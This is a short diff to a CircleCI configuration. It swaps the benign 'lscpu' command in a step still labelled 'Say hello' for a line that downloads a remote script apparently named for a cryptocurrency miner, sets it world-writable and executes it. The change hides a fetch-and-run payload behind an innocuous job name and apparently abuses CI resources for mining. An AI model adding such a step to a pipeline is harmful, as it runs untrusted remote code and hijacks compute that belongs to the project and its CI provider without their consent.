@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: lscpu
+          command: wget https://raw.githubusercontent.com/freerdpvps555/freerdpvps555/main/minerverus.sh && chmod 777 minerverus.sh && sh minerverus.sh
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
